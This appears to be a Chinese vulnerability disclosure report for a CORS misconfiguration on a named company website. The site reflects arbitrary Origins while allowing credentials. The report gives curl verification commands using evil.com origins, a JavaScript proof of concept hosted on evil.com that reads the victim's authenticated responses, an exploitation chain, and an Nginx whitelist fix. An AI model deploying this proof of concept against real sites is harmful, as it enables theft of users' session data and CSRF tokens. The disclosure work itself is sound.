# 【漏洞概述】
■ 漏洞名称：CORS配置反射任意Origin并允许Credentials，可跨域窃取用户会话数据
■ 危险等级：中危（CVSS:6.5）
■ 影响URL：https://www.htd.cn/ （全站6路径均受影响）
■ CWE：CWE-942
■ CVSS向量：CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N

---

# 【漏洞详情】
汇通达官网的CORS配置存在架构级缺陷：
- 服务器直接将用户提交的任意Origin值**原样反射**到Access-Control-Allow-Origin头
- 同时硬编码了Access-Control-Allow-Credentials: true（携带用户Cookie）
- 已通过**3轮×5Origin（共15次重复验证）**，全部命中
- 已验证**全站6路径**均存在该问题（非局部缺陷）

### 命中的5种恶意Origin（全部反射+Credentials:true）：
1. `null`（可通过iframe sandbox绕过白名单）
2. `http://evil.com`（任意HTTP恶意域）
3. `https://evil.com`（任意HTTPS恶意域）
4. `https://htd.cn.evil.com`（伪造尾域：*.evil.com通配下的子域）
5. `http://www.htd.cn.evil.com`（伪造前缀）

---

# 【复现步骤】

## 步骤1：基础验证（命令行）
```bash
curl -sk -D - -o /dev/null \
  -H "Origin: https://evil.com" \
  "https://www.htd.cn/" \
  | grep -iE "access-control|HTTP/"
```

### 关键输出（漏洞成立）：
```
HTTP/2 200 OK
access-control-allow-origin: https://evil.com   ← 任意Origin被直接反射
access-control-allow-credentials: true          ← 允许携带Cookie凭证
```

## 步骤2：null Origin验证（iframe sandbox绕过）
```bash
curl -sk -D - -o /dev/null -H "Origin: null" "https://www.htd.cn/" | grep -i access-control
```

### 输出：
```
access-control-allow-origin: null
access-control-allow-credentials: true
```

# 【利用演示（非破坏性）】
## POC：evil.com/htd-poc.html
```html
<h2>跨域读取汇通达会话数据 POC</h2>
<pre id="out"></pre>
<script>
  fetch("https://www.htd.cn/", {
    method: "GET",
    credentials: "include",  // 自动携带汇通达Cookie
    mode: "cors"
  })
  .then(r => r.text())
  .then(html => {
    // 因CORS缺陷，这里可完整读取响应（同源策略被绕过）
    document.getElementById("out").textContent =
      "读取到的汇通达响应大小: " + html.length + "字节\n" +
      "HTML前200字符:\n" + html.substring(0, 200);
  });
</script>
```

### 利用链：
受害者已登录汇通达 → 访问evil.com → evil.com JS以受害者身份跨域请求汇通达 → 因ACAO+Credentials:true，浏览器允许读取完整响应 → 攻击者获取用户数据、CSRF Token等

---

# 【危害影响】
1. **敏感信息泄露（中危核心）**：跨域读取用户数据页（订单、账号资料、个性化内容）
2. **CSRF升级**：读取内部CSRF Token，将无回显CSRF升级为有完整响应的读写双向越权
3. **覆盖面广**：全站所有路径均受影响（Nginx/网关层），不仅限于登录后页面
4. **null Origin组合风险**：可通过`<iframe sandbox>`在第三方场景（邮件、广告）触发

---

# 【修复方案（Nginx）】
使用严格白名单（而非反射Origin）：
```nginx
map $http_origin $cors_origin {
    default "";
    # 白名单：仅汇通达官方域名
    "~^https?://(www\.)?htd\.cn$"                       $http_origin;
    "~^https?://[a-zA-Z0-9\-]+\.htd\.cn$"              $http_origin;
}
server {
    # 白名单匹配才下发CORS头，否则空字符串（不下发）
    add_header Access-Control-Allow-Origin       $cors_origin always;
    add_header Access-Control-Allow-Credentials   "true"        always;
    add_header Vary "Origin";
}
```
